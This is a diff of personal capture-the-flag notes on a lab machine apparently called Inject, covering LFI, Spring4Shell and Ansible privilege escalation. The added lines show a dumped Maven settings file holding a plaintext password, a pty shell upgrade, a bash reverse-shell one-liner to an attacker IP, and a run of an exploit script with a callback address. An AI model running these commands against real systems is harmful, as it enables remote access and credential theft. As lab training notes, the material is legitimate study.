@@ -87,13 +87,45 @@ LFI exploit
 
 after checking we found that the MAven framework has spring4shell exploit
 
-so lets try and create a poc around taht
+so lets try and create a poc around that
 
 
+frank@inject:~/.m2$ cat settings.xml
+cat settings.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <servers>
+    <server>
+      <id>Inject</id>
+      <username>phil</username>
+      <password>DocPhillovestoInject123</password>
+      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
+      <filePermissions>660</filePermissions>
+      <directoryPermissions>660</directoryPermissions>
+      <configuration></configuration>
+    </server>
+  </servers>
+</settings>
+
+https://www.nickczh.com/upgrading-your-shell/
+upgrading shell
+
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+ansible privilege escalation
+
+https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/?ref=nickczh.com
+
+bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"
+
+└─$ python3 afterglow.py http://10.10.11.204:8080/ 10.10.16.24 1234
+python3 afterglow.py http://10.10.11.204:8080/ 10.10.16.24 1234   
 
 # lessons 
 
 1. Always check for LFI
+
 
 
 
